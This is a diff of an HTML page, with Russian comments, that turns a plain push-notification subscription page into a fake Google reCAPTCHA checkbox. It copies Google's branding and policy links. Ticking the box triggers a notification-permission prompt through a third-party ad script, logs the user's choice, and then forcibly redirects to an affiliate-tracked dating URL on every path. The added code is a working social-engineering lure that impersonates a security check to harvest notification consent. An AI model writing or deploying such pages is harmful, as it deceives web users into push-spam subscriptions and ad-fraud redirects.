@@ -3,15 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Push Subscriptions</title>
+    <meta name="tlsdk" content="6ce3ce667cc14beabf44647a39a3694d">
+    <title>reCAPTCHA</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .captcha-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 300px;
+            padding: 10px;
+            border: 1px solid #dfe1e5;
+            border-radius: 4px;
+            background-color: #fff;
+        }
+        .captcha-left {
+            display: flex;
+            align-items: center;
+        }
+        .captcha-checkbox {
+            margin-right: 10px;
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, border-color 0.3s ease;
+        }
+        .captcha-checkbox:checked {
+            background-color: #1a73e8;
+            border-color: #1a73e8;
+            animation: fillCheckbox 0.3s ease;
+        }
+        @keyframes fillCheckbox {
+            0% {
+                background-color: #fff;
+                border-color: #5f6368;
+            }
+            100% {
+                background-color: #1a73e8;
+                border-color: #1a73e8;
+            }
+        }
+        .captcha-text {
+            font-size: 14px;
+            color: #202124;
+        }
+        .captcha-right {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+        .captcha-logo {
+            width: 20px;
+            height: 20px;
+            margin-bottom: 5px;
+        }
+        .captcha-brand {
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        .captcha-links {
+            font-size: 10px;
+            color: #5f6368;
+        }
+        .captcha-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+        .submit-button {
+            padding: 8px 16px;
+            background-color: #f1f3f4;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
+        }
+        .submit-button:hover {
+            background-color: #e8eaed;
+        }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .error {
+            color: red;
+            font-size: 12px;
+            display: none;
+            margin-top: 5px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Push Notifications</h1>
-    <button id="subscribe-button">Подписаться на уведомления</button>
-    <div id="error" style="color: red; display: none;"></div>
+    <!-- Подключение ps.js с sub_id -->
+    <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=campaign1" async></script>
 
-    <!-- Подключение ps.js -->
-    <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=test_campaign" async></script>
+    <div class="container">
+        <div class="captcha-container">
+            <div class="captcha-left">
+                <input type="checkbox" id="captcha" class="captcha-checkbox">
+                <span class="captcha-text">Я не робот</span>
+            </div>
+            <div class="captcha-right">
+                <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
+                <span class="captcha-brand">reCAPTCHA</span>
+                <div class="captcha-links">
+                    <a href="https://policies.google.com/privacy" target="_blank">Конфиденциальность</a> - 
+                    <a href="https://policies.google.com/terms" target="_blank">Условия</a>
+                </div>
+            </div>
+        </div>
+        <div class="button-container">
+            <button class="submit-button" id="submit-button">Отправить</button>
+            <div class="error" id="error">Пожалуйста, подтвердите, что вы не робот.</div>
+        </div>
+    </div>
 
     <script>
         // Регистрация Service Worker
@@ -31,8 +151,11 @@
             document.getElementById('error').style.display = 'block';
         }
 
+        // Ссылка для редиректа
+        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
+
         // Функция для логирования подписки
-        function logSubscription(permission, subId = 'test_campaign') {
+        function logSubscription(permission, subId = 'campaign1') {
             const data = {
                 id: 'HnFv7gIgUEyhZsQd8kp20Q',
                 sub_id: subId,
@@ -48,27 +171,42 @@
             .catch(err => console.error('Ошибка отправки лога:', err));
         }
 
-        // Функция для запроса подписки
-        function requestSubscription() {
+        // Функция для выполнения редиректа
+        function performRedirect() {
+            console.log('Попытка редиректа на:', redirectUrl);
+            try {
+                window.location.href = redirectUrl;
+                setTimeout(() => {
+                    if (window.location.href !== redirectUrl) {
+                        window.location.replace(redirectUrl);
+                    }
+                }, 500);
+            } catch (e) {
+                console.error('Ошибка редиректа:', e);
+                document.getElementById('error').innerText = 'Редирект не сработал. Перейдите по ссылке: ' + redirectUrl;
+                document.getElementById('error').style.display = 'block';
+            }
+        }
+
+        // Функция для вызова подписки и редиректа
+        function requestSubscriptionAndRedirect() {
             const errorDiv = document.getElementById('error');
 
             // Проверяем статус уведомлений
             if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
                 console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
                 logSubscription(Notification.permission);
-                errorDiv.innerText = 'Уведомления уже настроены: ' + Notification.permission;
-                errorDiv.style.display = 'block';
+                setTimeout(performRedirect, 5000); // Увеличенная задержка
                 return;
             }
 
-            // Проверяем наличие API ps.js
+            // Проверяем наличие API от ps.js
             if (window.ps && typeof window.ps.showPrompt === 'function') {
                 console.log('Вызываем подписку через ps.js');
                 const timeout = setTimeout(() => {
-                    console.log('Тайм-аут: ps.js не вернул результат');
-                    errorDiv.innerText = 'Тайм-аут запроса подписки';
-                    errorDiv.style.display = 'block';
-                }, 5000);
+                    console.log('Тайм-аут: ps.js не вернул результат, выполняем редирект');
+                    performRedirect();
+                }, 5000); // Увеличенная задержка
 
                 try {
                     window.ps.showPrompt()
@@ -78,6 +216,7 @@
                             logSubscription(Notification.permission);
                             errorDiv.innerText = 'Подписка успешна!';
                             errorDiv.style.display = 'block';
+                            setTimeout(performRedirect, 5000); // Задержка после успешной подписки
                         })
                         .catch(err => {
                             clearTimeout(timeout);
@@ -85,12 +224,14 @@
                             logSubscription(Notification.permission);
                             errorDiv.innerText = 'Ошибка подписки: ' + err;
                             errorDiv.style.display = 'block';
+                            performRedirect();
                         })
                         .finally(() => {
                             if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
                                 clearTimeout(timeout);
-                                console.log('Статус уведомлений:', Notification.permission);
+                                console.log('Статус уведомлений после showPrompt:', Notification.permission);
                                 logSubscription(Notification.permission);
+                                performRedirect();
                             }
                         });
                 } catch (err) {
@@ -99,6 +240,7 @@
                     logSubscription('error');
                     errorDiv.innerText = 'Ошибка ps.js: ' + err;
                     errorDiv.style.display = 'block';
+                    performRedirect();
                 }
             } else {
                 console.log('API ps.js не доступен, используем Notification API');
@@ -109,24 +251,49 @@
                             logSubscription(permission);
                             errorDiv.innerText = 'Статус подписки: ' + permission;
                             errorDiv.style.display = 'block';
+                            setTimeout(performRedirect, 5000); // Задержка после подписки
                         })
                         .catch(err => {
                             console.error('Ошибка Notification API:', err);
                             logSubscription('error');
                             errorDiv.innerText = 'Ошибка Notification API: ' + err;
                             errorDiv.style.display = 'block';
+                            performRedirect();
                         });
                 } else {
                     console.log('Уведомления не поддерживаются');
                     logSubscription('unsupported');
                     errorDiv.innerText = 'Уведомления не поддерживаются вашим браузером';
                     errorDiv.style.display = 'block';
+                    performRedirect();
                 }
             }
         }
 
+        // Функция проверки чекбокса
+        function verify() {
+            const checkbox = document.getElementById('captcha');
+            const errorDiv = document.getElementById('error');
+            if (checkbox.checked) {
+                errorDiv.style.display = 'none';
+                setTimeout(requestSubscriptionAndRedirect, 300); // Задержка для анимации
+            } else {
+                errorDiv.innerText = 'Пожалуйста, подтвердите, что вы не робот.';
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        // Событие на клик по чекбоксу
+        document.getElementById('captcha').addEventListener('click', () => {
+            const checkbox = document.getElementById('captcha');
+            if (!checkbox.checked) {
+                checkbox.checked = true; // Устанавливаем галочку при клике
+            }
+            verify();
+        });
+
         // Событие на клик по кнопке
-        document.getElementById('subscribe-button').addEventListener('click', requestSubscription);
+        document.getElementById('submit-button').addEventListener('click', verify);
     </script>
 </body>
 </html>
